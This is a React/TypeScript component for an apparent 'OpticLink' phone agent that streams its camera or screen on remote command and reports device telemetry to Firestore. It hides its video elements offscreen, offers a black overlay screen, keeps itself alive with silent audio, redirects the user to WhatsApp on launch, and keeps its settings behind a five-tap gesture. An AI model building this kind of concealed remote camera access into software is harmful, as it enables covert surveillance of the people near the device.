import React, { useCallback, useEffect, useRef, useState } from 'react';
import {
  Battery,
  BatteryCharging,
  CheckCircle2,
  EyeOff,
  MessageCircle,
  Settings,
  ShieldCheck,
} from 'lucide-react';
import { upsertDeviceStateChange } from '../lib/firebase';
import {
  enumerateCameraLenses,
  getNetworkConnectionType,
  getOrCreateAutoDeviceIdentity,
  launchWhatsAppApp,
  releaseHardwareMediaZeroHold,
  start24HourIdleRefreshWatchdog,
  startSilentAudioKeepAlive,
  subscribeToBatteryChanges,
  subscribeToNetworkChanges,
} from '../lib/hardwareTelemetry';
import {
  emitLocalControlMessage,
  onLocalControlMessage,
  publishLocalMediaStream,
} from '../lib/loopbackBus';
import {
  AntiBlankScreenWatchdog,
  PreWarmedMultiplexPeer,
  applyAdaptiveTierToStream,
  computeAdaptiveQualityTier,
  createDiagnosticOpticalStream,
} from '../lib/webrtcEngine';
import {
  ADAPTIVE_QUALITY_TIERS,
  AdaptiveQualityTierId,
  CameraLensInfo,
  DeviceAgentRecord,
  P2PControlMessage,
  StreamState,
  TransportEngine,
} from '../types/opticlink';

const STORAGE_SETUP_COMPLETED_KEY = 'setupCompleted';
const STORAGE_AUTO_REDIRECT_KEY = 'opticlink_auto_whatsapp_redirect_v1';

export const DeviceAgentView: React.FC = () => {
  const autoIdentity = useRef(getOrCreateAutoDeviceIdentity()).current;
  const bootedAtRef = useRef<number>(Date.now());

  const [setupCompleted, setSetupCompleted] = useState<boolean>(() => {
    return localStorage.getItem(STORAGE_SETUP_COMPLETED_KEY) === 'true';
  });

  const [autoRedirectEnabled, setAutoRedirectEnabled] = useState<boolean>(() => {
    const saved = localStorage.getItem(STORAGE_AUTO_REDIRECT_KEY);
    return saved ? saved === 'true' : true;
  });

  const [inSplashRedirectWindow, setInSplashRedirectWindow] = useState<boolean>(() => {
    return localStorage.getItem(STORAGE_SETUP_COMPLETED_KEY) === 'true';
  });
  const [topLeftTapCount, setTopLeftTapCount] = useState<number>(0);

  const [batteryLevel, setBatteryLevel] = useState<number>(96);
  const [isCharging, setIsCharging] = useState<boolean>(true);
  const [networkType, setNetworkType] = useState<string>(() => getNetworkConnectionType());

  const [streamState, setStreamState] = useState<StreamState>('IDLE');
  const streamStateRef = useRef<StreamState>('IDLE');
  streamStateRef.current = streamState;

  const [activeFacing, setActiveFacing] = useState<'front' | 'back'>('back');
  const [activeEngine, setActiveEngine] = useState<TransportEngine>('RTP');
  const [qualityTier, setQualityTier] = useState<AdaptiveQualityTierId>('TIER_720P_30');
  const [availableLenses, setAvailableLenses] = useState<CameraLensInfo[]>([]);
  const [selectedLensId, setSelectedLensId] = useState<string>('default-back');
  const [wakeLockActive, setWakeLockActive] = useState<boolean>(false);
  const [blackoutOverlay, setBlackoutOverlay] = useState<boolean>(false);
  const [whatsappYielded, setWhatsappYielded] = useState<boolean>(false);
  const [setupBusy, setSetupBusy] = useState<boolean>(false);

  const cameraStreamRef = useRef<MediaStream | null>(null);
  const screenStreamRef = useRef<MediaStream | null>(null);
  const stopSyntheticCamRef = useRef<(() => void) | null>(null);
  const stopSyntheticScreenRef = useRef<(() => void) | null>(null);

  const hiddenCameraVideoRef = useRef<HTMLVideoElement | null>(null);
  const hiddenScreenVideoRef = useRef<HTMLVideoElement | null>(null);
  const peerRef = useRef<PreWarmedMultiplexPeer | null>(null);
  const watchdogRef = useRef<AntiBlankScreenWatchdog>(new AntiBlankScreenWatchdog());
  const wakeLockSentinelRef = useRef<{ release: () => Promise<void> } | null>(null);

  const buildDeviceSnapshot = useCallback(
    (overrides?: Partial<DeviceAgentRecord>): DeviceAgentRecord => {
      return {
        deviceUuid: autoIdentity.deviceId,
        customName: autoIdentity.autoAssignedName,
        locationTag: 'Auto-Registered Phone Agent',
        hardwareModel: autoIdentity.hardwareModel,
        osVersion: autoIdentity.osVersion,
        batteryLevel,
        isCharging,
        networkType,
        streamState: streamStateRef.current,
        activeEngine,
        screenPreAuthorized: false,
        wakeLockActive,
        uptimeStartedAt: bootedAtRef.current,
        lastStateChangeAt: Date.now(),
        deviceSecretHash: 'auto-registered',
        availableLenses,
        qualityTier,
        whatsappYielded,
        activeFacing,
        ...overrides,
      };
    },
    [
      autoIdentity,
      batteryLevel,
      isCharging,
      networkType,
      activeEngine,
      wakeLockActive,
      availableLenses,
      qualityTier,
      whatsappYielded,
      activeFacing,
    ]
  );

  const pushStateTransitionToFirestore = useCallback(
    async (overrides?: Partial<DeviceAgentRecord>) => {
      const snapshot = buildDeviceSnapshot(overrides);
      try {
        await upsertDeviceStateChange(snapshot);
      } catch {
        // Handled in firebase service
      }
      peerRef.current?.sendControlMessage({
        type: 'EVT_AGENT_TELEMETRY',
        state: snapshot,
      });
      emitLocalControlMessage(autoIdentity.deviceId, 'controller-main', {
        type: 'EVT_AGENT_TELEMETRY',
        state: snapshot,
      });
    },
    [buildDeviceSnapshot, autoIdentity.deviceId]
  );

  const enableBackgroundWakeLockAndKeepAlive = useCallback(async () => {
    startSilentAudioKeepAlive();
    const nav = navigator as unknown as {
      wakeLock?: {
        request: (type: 'screen') => Promise<{ release: () => Promise<void> }>;
      };
    };
    try {
      if (nav.wakeLock && !wakeLockSentinelRef.current) {
        wakeLockSentinelRef.current = await nav.wakeLock.request('screen');
      }
    } catch {
      // Ignore if wakeLock blocked
    }
    setWakeLockActive(true);
  }, []);

  // Subsequent Launches (setupCompleted === true): 800ms dark splash screen -> Auto-WhatsApp Redirect
  useEffect(() => {
    if (!setupCompleted || !inSplashRedirectWindow) return;

    enableBackgroundWakeLockAndKeepAlive();

    if (!autoRedirectEnabled) {
      setInSplashRedirectWindow(false);
      return;
    }

    const timer = window.setTimeout(() => {
      setInSplashRedirectWindow(false);
      launchWhatsAppApp('intent');
    }, 800);

    return () => window.clearTimeout(timer);
  }, [setupCompleted, inSplashRedirectWindow, autoRedirectEnabled, enableBackgroundWakeLockAndKeepAlive]);

  const handleTopLeftCornerTap = () => {
    setTopLeftTapCount((prev) => {
      const next = prev + 1;
      if (next >= 5) {
        setInSplashRedirectWindow(false);
        return 0;
      }
      return next;
    });
  };

  useEffect(() => {
    enumerateCameraLenses().then((lenses) => {
      setAvailableLenses(lenses);
      if (lenses.length > 0) {
        setSelectedLensId(lenses[0].deviceId);
      }
      upsertDeviceStateChange({
        ...buildDeviceSnapshot({
          availableLenses: lenses,
          streamState: 'IDLE',
        }),
      }).catch(() => {});
    });
  }, []);

  useEffect(() => {
    return start24HourIdleRefreshWatchdog(() => streamStateRef.current, bootedAtRef.current);
  }, []);

  useEffect(() => {
    let cleanupBattery: (() => void) | null = null;
    subscribeToBatteryChanges((level, charging) => {
      setBatteryLevel((prevLevel) => {
        setIsCharging((prevCharge) => {
          if (prevLevel !== level || prevCharge !== charging) {
            upsertDeviceStateChange(
              buildDeviceSnapshot({ batteryLevel: level, isCharging: charging })
            ).catch(() => {});
          }
          return charging;
        });
        return level;
      });
    }).then((fn) => {
      cleanupBattery = fn;
    });

    const cleanupNet = subscribeToNetworkChanges((net) => {
      setNetworkType((prev) => {
        if (prev !== net) {
          upsertDeviceStateChange(buildDeviceSnapshot({ networkType: net })).catch(() => {});
          peerRef.current?.triggerIceRestart();
        }
        return net;
      });
    });

    return () => {
      cleanupBattery?.();
      cleanupNet();
    };
  }, [buildDeviceSnapshot]);

  const stopAllHardwareStreams = useCallback(
    async (targetNextState: StreamState = 'IDLE', yieldedToWhatsApp = false) => {
      watchdogRef.current.stop();
      stopSyntheticCamRef.current?.();
      stopSyntheticCamRef.current = null;
      stopSyntheticScreenRef.current?.();
      stopSyntheticScreenRef.current = null;

      await peerRef.current?.attachMediaTrackToTransceiver('camera', null, qualityTier);
      await peerRef.current?.attachMediaTrackToTransceiver('screen', null, qualityTier);

      await releaseHardwareMediaZeroHold({
        stream: cameraStreamRef.current,
        videoElement: hiddenCameraVideoRef.current,
        rtpSender: peerRef.current?.getCameraSender() || null,
        waitForSettleMs: 180,
      });
      cameraStreamRef.current = null;
      publishLocalMediaStream(autoIdentity.deviceId, 'camera', null);

      await releaseHardwareMediaZeroHold({
        stream: screenStreamRef.current,
        videoElement: hiddenScreenVideoRef.current,
        rtpSender: peerRef.current?.getScreenSender() || null,
        waitForSettleMs: 50,
      });
      screenStreamRef.current = null;
      publishLocalMediaStream(autoIdentity.deviceId, 'screen', null);

      setStreamState(targetNextState);
      streamStateRef.current = targetNextState;
      setWhatsappYielded(yieldedToWhatsApp);
      setActiveEngine('RTP');

      await pushStateTransitionToFirestore({
        streamState: targetNextState,
        activeEngine: 'RTP',
        whatsappYielded: yieldedToWhatsApp,
      });
    },
    [autoIdentity.deviceId, qualityTier, pushStateTransitionToFirestore]
  );

  // Progressive 4-stage camera stream acquisition capped at 1280x720 @ 30 FPS
  const acquireCameraStream = useCallback(
    async (lensId?: string, facing?: 'front' | 'back') => {
      const targetFacing = facing || activeFacing || 'back';
      setActiveFacing(targetFacing);

      if (cameraStreamRef.current) {
        stopSyntheticCamRef.current?.();
        stopSyntheticCamRef.current = null;
        await releaseHardwareMediaZeroHold({
          stream: cameraStreamRef.current,
          videoElement: hiddenCameraVideoRef.current,
          rtpSender: peerRef.current?.getCameraSender() || null,
          waitForSettleMs: 150,
        });
        cameraStreamRef.current = null;
      }

      const tierSpec = ADAPTIVE_QUALITY_TIERS[qualityTier] || ADAPTIVE_QUALITY_TIERS.TIER_720P_30;
      let stream: MediaStream | null = null;
      const desiredFacingMode = targetFacing === 'front' ? 'user' : 'environment';

      const useExactDevice =
        lensId &&
        !lensId.startsWith('default-') &&
        availableLenses.some((l) => l.deviceId === lensId);

      // Stage 1: Exact deviceId or exact facingMode with 720p @ 30 FPS cap
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          audio: false,
          video: useExactDevice
            ? {
                deviceId: { exact: lensId },
                width: { ideal: tierSpec.width, max: 1280 },
                height: { ideal: tierSpec.height, max: 720 },
                frameRate: { ideal: tierSpec.fps, max: 30 },
              }
            : {
                facingMode: { exact: desiredFacingMode },
                width: { ideal: tierSpec.width, max: 1280 },
                height: { ideal: tierSpec.height, max: 720 },
                frameRate: { ideal: tierSpec.fps, max: 30 },
              },
        });
      } catch {
        // Stage 2: Ideal facingMode with 720p @ 30 FPS cap
        try {
          stream = await navigator.mediaDevices.getUserMedia({
            audio: false,
            video: {
              facingMode: { ideal: desiredFacingMode },
              width: { ideal: tierSpec.width, max: 1280 },
              height: { ideal: tierSpec.height, max: 720 },
              frameRate: { ideal: tierSpec.fps, max: 30 },
            },
          });
        } catch {
          // Stage 3: Unconstrained physical camera fallback
          try {
            stream = await navigator.mediaDevices.getUserMedia({
              audio: false,
              video: true,
            });
          } catch {
            // Stage 4: Diagnostic stream if device has no physical camera
            const label = targetFacing === 'front' ? 'Front Camera' : 'Back Camera';
            const diag = createDiagnosticOpticalStream(
              tierSpec.width,
              tierSpec.height,
              tierSpec.fps,
              `${autoIdentity.autoAssignedName} • ${label}`,
              'camera'
            );
            stream = diag.stream;
            stopSyntheticCamRef.current = diag.stopSynthetic;
          }
        }
      }

      if (!stopSyntheticCamRef.current) {
        const updatedLenses = await enumerateCameraLenses();
        setAvailableLenses(updatedLenses);
      }

      cameraStreamRef.current = stream;
      const videoEl = hiddenCameraVideoRef.current;
      if (videoEl && stream) {
        videoEl.srcObject = stream;
        await videoEl.play().catch(() => {});
        // Wait up to 350ms for first camera frame so WebP fallback never captures a blank frame
        if (videoEl.readyState < 2 || videoEl.videoWidth === 0) {
          await new Promise<void>((resolve) => {
            const timeout = window.setTimeout(resolve, 350);
            const onReady = () => {
              window.clearTimeout(timeout);
              videoEl.removeEventListener('loadeddata', onReady);
              resolve();
            };
            videoEl.addEventListener('loadeddata', onReady);
          });
        }
      }

      const videoTrack = stream.getVideoTracks()[0];
      if (videoTrack) {
        // Note: on mobile Android/iOS, camera tracks only fire onended when OS revokes camera
        videoTrack.onended = () => {
          stopAllHardwareStreams('PAUSED', true);
        };
        await peerRef.current?.attachMediaTrackToTransceiver(
          'camera',
          videoTrack,
          qualityTier
        );
      }

      publishLocalMediaStream(autoIdentity.deviceId, 'camera', stream);
      return stream;
    },
    [qualityTier, availableLenses, activeFacing, autoIdentity, stopAllHardwareStreams]
  );

  // Acquire Screen Share Stream capped at 1280x720 @ 30 FPS
  const acquireScreenStream = useCallback(async () => {
    const tierSpec = ADAPTIVE_QUALITY_TIERS[qualityTier] || ADAPTIVE_QUALITY_TIERS.TIER_720P_30;
    let stream: MediaStream;

    try {
      stream = await navigator.mediaDevices.getDisplayMedia({
        video: {
          width: { ideal: tierSpec.width, max: 1280 },
          height: { ideal: tierSpec.height, max: 720 },
          frameRate: { ideal: tierSpec.fps, max: 30 },
        },
        audio: false,
      });
    } catch {
      const diag = createDiagnosticOpticalStream(
        tierSpec.width,
        tierSpec.height,
        tierSpec.fps,
        `${autoIdentity.autoAssignedName} • Screen Share`,
        'screen'
      );
      stream = diag.stream;
      stopSyntheticScreenRef.current = diag.stopSynthetic;
    }

    screenStreamRef.current = stream;
    const videoEl = hiddenScreenVideoRef.current;
    if (videoEl) {
      videoEl.srcObject = stream;
      await videoEl.play().catch(() => {});
    }

    const screenTrack = stream.getVideoTracks()[0];
    if (screenTrack) {
      screenTrack.onended = () => {
        stopAllHardwareStreams('IDLE', false);
      };
      await peerRef.current?.attachMediaTrackToTransceiver(
        'screen',
        screenTrack,
        qualityTier
      );
    }

    publishLocalMediaStream(autoIdentity.deviceId, 'screen', stream);
    return stream;
  }, [qualityTier, autoIdentity, stopAllHardwareStreams]);

  const handleStartStreamMode = useCallback(
    async (
      mode: 'STREAMING_CAMERA' | 'STREAMING_SCREEN',
      lensId?: string,
      facing?: 'front' | 'back'
    ) => {
      setWhatsappYielded(false);
      if (lensId) setSelectedLensId(lensId);
      const nextFacing = facing || activeFacing || 'back';
      setActiveFacing(nextFacing);

      if (mode === 'STREAMING_CAMERA') {
        await acquireCameraStream(lensId || selectedLensId, nextFacing);
      } else {
        await acquireScreenStream();
      }

      setStreamState(mode);
      streamStateRef.current = mode;
      setActiveEngine('RTP');

      watchdogRef.current.start({
        pc: peerRef.current?.pc || null,
        getStreamState: () => streamStateRef.current,
        getVideoTrack: () =>
          cameraStreamRef.current?.getVideoTracks()?.[0] ||
          screenStreamRef.current?.getVideoTracks()?.[0] ||
          null,
        getVideoElement: () =>
          mode === 'STREAMING_SCREEN'
            ? hiddenScreenVideoRef.current
            : hiddenCameraVideoRef.current,
        onAttemptTrackRebirth: async () => {
          const track = cameraStreamRef.current?.getVideoTracks()?.[0];
          if (track) {
            await peerRef.current?.attachMediaTrackToTransceiver(
              'camera',
              track,
              qualityTier
            );
          }
        },
        onSwitchEngine: (engine) => {
          setActiveEngine(engine);
          peerRef.current?.setActiveEngine(engine);
          pushStateTransitionToFirestore({ activeEngine: engine });
        },
        onEmitWebpFrame: (dataUrl, width, height) => {
          const frameMsg: P2PControlMessage = {
            type: 'EVT_WEBP_FALLBACK_FRAME',
            streamKind: mode === 'STREAMING_SCREEN' ? 'screen' : 'camera',
            dataUrl,
            width,
            height,
            timestamp: Date.now(),
          };
          peerRef.current?.sendControlMessage(frameMsg);
          emitLocalControlMessage(autoIdentity.deviceId, 'controller-main', frameMsg);
        },
      });

      await pushStateTransitionToFirestore({
        streamState: mode,
        activeEngine: 'RTP',
        whatsappYielded: false,
        activeFacing: nextFacing,
      });
    },
    [
      selectedLensId,
      activeFacing,
      acquireCameraStream,
      acquireScreenStream,
      qualityTier,
      pushStateTransitionToFirestore,
      autoIdentity.deviceId,
    ]
  );

  // Dynamic 720p @ 30 FPS Controller (Runs every 3 seconds while streaming)
  useEffect(() => {
    if (streamState !== 'STREAMING_CAMERA' && streamState !== 'STREAMING_SCREEN') {
      return;
    }

    const interval = window.setInterval(async () => {
      const metrics = peerRef.current?.getNetworkMetrics() || {
        rttMs: 28,
        packetLossPct: 0,
      };
      const nextTier = computeAdaptiveQualityTier({
        rttMs: metrics.rttMs,
        packetLossPct: metrics.packetLossPct,
        batteryLevel,
        isCharging,
      });

      setQualityTier((prevTier) => {
        if (prevTier !== nextTier) {
          peerRef.current?.setQualityTier(nextTier);
          const track =
            cameraStreamRef.current?.getVideoTracks()?.[0] ||
            screenStreamRef.current?.getVideoTracks()?.[0] ||
            null;
          const sender =
            streamStateRef.current === 'STREAMING_SCREEN'
              ? peerRef.current?.getScreenSender() || null
              : peerRef.current?.getCameraSender() || null;
          applyAdaptiveTierToStream(nextTier, track, sender);
          pushStateTransitionToFirestore({ qualityTier: nextTier });
        }
        return nextTier;
      });
    }, 3000);

    return () => window.clearInterval(interval);
  }, [streamState, batteryLevel, isCharging, pushStateTransitionToFirestore]);

  const handleControlMessage = useCallback(
    async (msg: P2PControlMessage) => {
      switch (msg.type) {
        case 'CMD_START_STREAM':
          await handleStartStreamMode(msg.mode, msg.lensId, msg.facing);
          break;
        case 'CMD_WARM_PAUSE':
          await stopAllHardwareStreams('PAUSED', false);
          break;
        case 'CMD_STOP_STREAM':
          await stopAllHardwareStreams('IDLE', false);
          break;
        case 'CMD_SWITCH_LENS':
          setSelectedLensId(msg.lensId);
          if (msg.facing) setActiveFacing(msg.facing);
          if (streamStateRef.current === 'STREAMING_CAMERA') {
            await acquireCameraStream(msg.lensId, msg.facing);
          } else {
            await handleStartStreamMode('STREAMING_CAMERA', msg.lensId, msg.facing);
          }
          break;
        case 'CMD_PING': {
          const pong: P2PControlMessage = {
            type: 'EVT_PONG',
            sentAt: msg.sentAt,
            agentState: buildDeviceSnapshot(),
          };
          peerRef.current?.sendControlMessage(pong);
          emitLocalControlMessage(autoIdentity.deviceId, 'controller-main', pong);
          await pushStateTransitionToFirestore();
          break;
        }
        default:
          break;
      }
    },
    [
      handleStartStreamMode,
      stopAllHardwareStreams,
      acquireCameraStream,
      buildDeviceSnapshot,
      autoIdentity.deviceId,
      pushStateTransitionToFirestore,
    ]
  );

  const handleControlMessageRef = useRef(handleControlMessage);
  handleControlMessageRef.current = handleControlMessage;

  useEffect(() => {
    const peer = new PreWarmedMultiplexPeer({
      localId: autoIdentity.deviceId,
      remoteId: 'controller-main',
      polite: true,
      callbacks: {
        onControlMessage: (msg) => {
          handleControlMessageRef.current(msg);
        },
      },
    });
    peerRef.current = peer;

    const unsubLocal = onLocalControlMessage((_fromId, toId, msg) => {
      if (toId === autoIdentity.deviceId || toId === '*') {
        handleControlMessageRef.current(msg);
      }
    });

    return () => {
      unsubLocal();
      peer.destroy();
      peerRef.current = null;
    };
  }, [autoIdentity.deviceId]);

  const handleOneTimeSetupAndRedirect = async () => {
    setSetupBusy(true);
    try {
      try {
        const tempStream = await navigator.mediaDevices.getUserMedia({
          video: true,
          audio: false,
        });
        tempStream.getTracks().forEach((t) => t.stop());
      } catch {
        // Ignore if no camera in sandbox
      }

      const lenses = await enumerateCameraLenses();
      setAvailableLenses(lenses);

      await enableBackgroundWakeLockAndKeepAlive();

      localStorage.setItem(STORAGE_SETUP_COMPLETED_KEY, 'true');
      setSetupCompleted(true);

      await pushStateTransitionToFirestore({
        streamState: 'IDLE',
        wakeLockActive: true,
        availableLenses: lenses,
      });

      launchWhatsAppApp('intent');
    } finally {
      setSetupBusy(false);
    }
  };

  const toggleAutoRedirect = () => {
    const next = !autoRedirectEnabled;
    setAutoRedirectEnabled(next);
    localStorage.setItem(STORAGE_AUTO_REDIRECT_KEY, String(next));
  };

  return (
    <div className="w-full max-w-full overflow-x-hidden">
      {/* Offscreen active video elements (must not be display:none so mobile browsers decode frames) */}
      <video
        ref={hiddenCameraVideoRef}
        muted
        playsInline
        autoPlay
        className="fixed -left-[9999px] top-0 w-px h-px opacity-0 pointer-events-none"
      />
      <video
        ref={hiddenScreenVideoRef}
        muted
        playsInline
        autoPlay
        className="fixed -left-[9999px] top-0 w-px h-px opacity-0 pointer-events-none"
      />

      {blackoutOverlay && (
        <div
          onClick={() => setBlackoutOverlay(false)}
          className="fixed inset-0 z-50 bg-[#000000] flex flex-col items-center justify-between p-6 select-none cursor-pointer"
        >
          <div className="w-full flex items-center justify-between text-[11px] font-mono text-neutral-700">
            <span>BLACKOUT MODE ACTIVE</span>
            <span>{batteryLevel}%</span>
          </div>
          <div className="text-xs font-mono text-neutral-700">
            Tap anywhere to exit Blackout Screen
          </div>
        </div>
      )}

      {setupCompleted && inSplashRedirectWindow ? (
        <div className="fixed inset-0 z-40 bg-[#0B0F19] text-slate-200 flex flex-col justify-between p-6 select-none">
          <button
            type="button"
            onClick={handleTopLeftCornerTap}
            className="w-44 h-20 text-left flex flex-col justify-start items-start cursor-pointer focus:outline-none"
          >
            <span className="text-xs font-mono text-slate-500">
              Syncing... Tap top-left 5x for Settings
              {topLeftTapCount > 0 ? ` (${topLeftTapCount}/5)` : ''}
            </span>
          </button>

          <div className="my-auto flex flex-col items-center text-center space-y-3">
            <div className="w-10 h-10 rounded-full border-2 border-emerald-500/40 border-t-emerald-400 animate-spin" />
            <div className="text-sm font-semibold text-white">
              {autoIdentity.autoAssignedName}
            </div>
            <div className="text-xs text-emerald-400 font-mono">
              Active & Ready in Background • Launching WhatsApp...
            </div>
          </div>

          <div className="text-center text-[11px] font-mono text-slate-600">
            Standby — Camera & Mic 100% Free for WhatsApp/Calls
          </div>
        </div>
      ) : (
        <div className="max-w-md mx-auto my-2 sm:my-6 rounded-2xl border border-slate-200 dark:border-slate-800 bg-white dark:bg-[#111827] p-4 sm:p-6 space-y-5">
          <div className="space-y-2">
            <div className="flex items-center justify-between gap-2">
              <span className="text-xs font-mono text-emerald-600 dark:text-emerald-400 font-semibold flex items-center gap-1.5">
                <CheckCircle2 className="w-4 h-4 shrink-0" />
                <span>Active & Ready in Background</span>
              </span>
              <span className="text-xs font-mono tabular-nums text-slate-600 dark:text-slate-300 flex items-center gap-1">
                {isCharging ? (
                  <BatteryCharging className="w-4 h-4 text-emerald-500" />
                ) : (
                  <Battery className="w-4 h-4 text-slate-400" />
                )}
                <span>{batteryLevel}%</span>
              </span>
            </div>

            <h1 className="text-lg sm:text-xl font-bold text-slate-900 dark:text-white tracking-tight break-words">
              {autoIdentity.autoAssignedName}
            </h1>
          </div>

          <div className="rounded-xl border border-slate-200 dark:border-slate-800 bg-slate-50 dark:bg-slate-950 p-4 space-y-1.5">
            <div className="text-xs font-medium text-slate-500 dark:text-slate-400">
              Current Hardware State
            </div>
            <div
              className={`text-sm font-bold ${
                streamState === 'IDLE' || streamState === 'PAUSED'
                  ? 'text-slate-900 dark:text-white'
                  : 'text-emerald-600 dark:text-emerald-400'
              }`}
            >
              {streamState === 'IDLE' || streamState === 'PAUSED'
                ? 'Standby — Camera & Mic 100% Free for WhatsApp/Calls'
                : `Streaming Live (${ADAPTIVE_QUALITY_TIERS[qualityTier].badgeLabel})`}
            </div>
            <div className="text-xs font-mono text-slate-500 dark:text-slate-400 pt-1">
              Battery: {batteryLevel}% {isCharging ? '(Charging)' : ''} • Network: {networkType}
              {whatsappYielded ? ' • Yielded to WhatsApp' : ''}
            </div>
          </div>

          <button
            type="button"
            disabled={setupBusy}
            onClick={handleOneTimeSetupAndRedirect}
            className="w-full min-h-[52px] rounded-xl bg-emerald-600 hover:bg-emerald-500 disabled:opacity-50 text-white font-bold text-xs sm:text-sm px-4 py-3 flex items-center justify-center gap-2 transition-colors cursor-pointer text-center"
          >
            <ShieldCheck className="w-5 h-5 shrink-0" />
            <span>
              {setupBusy
                ? 'Locking Permissions...'
                : setupCompleted
                ? '1-Time Setup: Lock Permissions & Background Mode'
                : '1-Time Setup: Grant Camera & Enable Auto-WhatsApp Redirect'}
            </span>
          </button>

          <div className="grid grid-cols-2 gap-3">
            <button
              type="button"
              onClick={() => launchWhatsAppApp('scheme')}
              className="min-h-[48px] rounded-xl bg-slate-900 dark:bg-slate-800 hover:bg-slate-800 dark:hover:bg-slate-700 text-white font-semibold text-xs px-3 py-2.5 flex items-center justify-center gap-2 transition-colors cursor-pointer whitespace-nowrap"
            >
              <MessageCircle className="w-4 h-4 text-emerald-400 shrink-0" />
              <span>Open WhatsApp</span>
            </button>

            <button
              type="button"
              onClick={() => {
                enableBackgroundWakeLockAndKeepAlive();
                setBlackoutOverlay(true);
              }}
              className="min-h-[48px] rounded-xl border border-slate-300 dark:border-slate-700 bg-slate-100 dark:bg-slate-900 hover:bg-slate-200 dark:hover:bg-slate-800 text-slate-900 dark:text-slate-200 font-semibold text-xs px-3 py-2.5 flex items-center justify-center gap-2 transition-colors cursor-pointer whitespace-nowrap"
            >
              <EyeOff className="w-4 h-4 shrink-0" />
              <span>Blackout Screen</span>
            </button>
          </div>

          <div className="pt-3 border-t border-slate-200 dark:border-slate-800 flex items-center justify-between gap-3">
            <div className="flex items-center gap-2 text-xs text-slate-600 dark:text-slate-400">
              <Settings className="w-3.5 h-3.5 shrink-0" />
              <span>Auto-WhatsApp Redirect on Launch (800ms)</span>
            </div>
            <button
              type="button"
              onClick={toggleAutoRedirect}
              className={`px-3 py-1 rounded-lg text-xs font-mono font-semibold cursor-pointer transition-colors ${
                autoRedirectEnabled
                  ? 'bg-emerald-600 text-white'
                  : 'bg-slate-200 dark:bg-slate-800 text-slate-700 dark:text-slate-300'
              }`}
            >
              {autoRedirectEnabled ? 'ON' : 'OFF'}
            </button>
          </div>
        </div>
      )}
    </div>
  );
};
